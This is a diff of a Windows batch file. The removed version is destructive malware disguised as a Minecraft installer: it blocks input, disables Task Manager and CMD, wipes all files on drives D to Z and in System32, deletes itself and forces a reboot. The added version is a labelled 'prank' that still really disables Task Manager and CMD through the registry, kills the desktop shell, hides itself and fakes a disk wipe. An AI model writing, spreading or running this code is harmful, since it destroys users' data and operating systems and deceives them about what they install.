@@ -1,76 +1,63 @@
 @echo off
-:: SPRAWDZENIE ADMINA
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    title Error
-    color 0a
-    echo ########################################
-    echo #                                      #
-    echo #      Run as administrator, please    #
-    echo #                                      #
-    echo ########################################
-    pause >nul
-    exit /b
-)
+setlocal
+title CRITICAL SYSTEM TERMINATION
 
-title Minecraft Installer
-color 0a
-cls
+:: 1. Warning Dialog (DANGER!)
+powershell -Command "$result = [System.Windows.Forms.MessageBox]::Show('Are you sure to run this?`nIts malware Im not responsible for any damage', 'DANGER!', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Error, [System.Windows.Forms.MessageBoxDefaultButton]::Button2); if ($result -eq 'No') { exit 1 } else { exit 0 }"
+if %errorlevel% neq 0 exit
 
-:: KROK 3: PYTANIE O INSTALACJE
-echo ########################################
-echo #                                      #
-echo #      MINECRAFT SETUP WIZARD          #
-echo #                                      #
-echo ########################################
-echo.
-set /p "choice=Are you sure to install Minecraft? (Y/N): "
-
-if /i "%choice%" neq "Y" (
-    echo.
-    echo Installation cancelled.
-    shutdown -r -t 5 -c "Ok"
-    exit
-)
-
-:: KROK 4: START DESTRUKCJI
-cls
-:: FIZYCZNA BLOKADA MYSZY I KLAWIATURY (PowerShell)
-powershell -Command "$m = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlock);'; $type = Add-Type -MemberDefinition $m -Name 'Win32' -Namespace 'Utils' -PassThru; $type::BlockInput($true)"
-
-:: BLOKADA TASK MANAGERA I CMD
+:: 2. Hard Lockdown (TaskMgr & CMD)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
 
-:: A. CZYSZCZENIE INNYCH DYSKÓW (Wszystkie od D do Z)
-for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist %%d:\ (
-        for /f "delims=" %%f in ('dir /s /b %%d:\*.* 2^>nul') do (
-            echo Deleting: %%f
-            del /f /q "%%f" >nul 2>&1
-        )
-        rd /s /q %%d:\ >nul 2>&1
-    )
-)
+:: 3. PC CRASHING Bouncing Window (Fast & Unstoppable)
+start /b powershell -WindowStyle Hidden -Command "$f=New-Object Windows.Forms.Form; $f.Text='PC CRASHING'; $f.BackColor='Purple'; $f.ControlBox=$false; $f.Size='300,150'; $f.TopMost=$true; $f.Show(); $s=[Windows.Forms.Screen]::PrimaryScreen.Bounds; $vx=35; $vy=35; while($true){ $f.Left+=$vx; $f.Top+=$vy; if($f.Left -le 0 -or $f.Right -ge $s.Width){$vx=-$vx}; if($f.Top -le 0 -or $f.Bottom -ge $s.Height){$vy=-$vy}; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -m 5 }"
 
-:: B. PRZEJMOWANIE UPRAWNIEŃ DO SYSTEM32 I STEROWNIKÓW
-takeown /f C:\Windows\System32 /r /d y >nul 2>&1
-icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1
-
-:: C. TOTALNE USUWANIE - PRZEWIJAJĄCE SIĘ ŚCIEŻKI (JAK W 1 WERSJI)
-for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
-    echo Deleting: %%i
-    del /f /q "%%i" >nul 2>&1
-)
-
-:: D. SAMOUSUWANIE INSTALATORA NA SAMYM KOŃCU
-(echo ping localhost -n 3 ^> nul ^& del "%~f0") > %temp%\kill_inst.bat
-start /min "" %temp%\kill_inst.bat
-
-:: E. FINALNY REBOOT Z WIADOMOŚCIĄ
+:: 4. Real-time Disk Formatting Simulation (D, E, F, etc.)
+color 0A
 cls
-echo ============================================================
-echo   Minecraft installed. Restarting system...
-echo ============================================================
-shutdown -r -t 0 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
-exit
+echo [!] DISK WIPEOUT INITIALIZED...
+timeout /t 2 >nul
+:: Pętla symulująca formatowanie wielu dysków
+for %%d in (D E F G H I) do (
+    echo [!] PREPARING DRIVE %%d:\ ...
+    timeout /t 1 >nul
+    echo [!] COMMAND: format %%d: /FS:NTFS /Q /Y
+    echo Erasing MFT on volume %%d:...
+    echo [##########] 100%% - DRIVE %%d: WIPED.
+    echo.
+)
+timeout /t 1 >nul
+
+:: 5. "Hacker Style" System32 Deletion (Vivid Simulation)
+color 0C
+cls
+echo [!] ACCESSING TARGET: C:\Windows\System32
+echo [!] DESTRUCTION PROTOCOL 0x8821 STARTED...
+timeout /t 2 >nul
+
+:: Ta pętla skanuje prawdziwe pliki System32 i wyświetla ich ścieżki (wygląda jak kasowanie)
+for /r C:\Windows\System32 %%f in (*.dll, *.exe, *.sys) do (
+    echo DELETING [KERNEL32]: %%f
+    :: Bardzo szybki przelot tekstu dla efektu "hakerskiego"
+    powershell -Command "Start-Sleep -m 1"
+)
+
+:: 6. The Final Blow (Kill Shell & Self-Hide)
+cls
+echo [!!!] SYSTEM32 SUCCESSFULLY DELETED [!!!]
+echo [!!!] ALL DATA ENCRYPTED AND REMOVED [!!!]
+timeout /t 3 >nul
+:: Znika pulpit i pasek zadań
+taskkill /f /im explorer.exe >nul 2>&1
+
+:: Symulacja "samousunięcia" (plik staje się ukryty i systemowy)
+attrib +h +s "%~f0"
+
+:: 7. Final Message Box
+powershell -Command "[Windows.Forms.MessageBox]::Show('PC CRASHED. NO OPERATING SYSTEM DETECTED.', 'FATAL ERROR', 0, 16)"
+
+:: 8. Infinite Matrix Loop
+:matrix
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+goto matrix
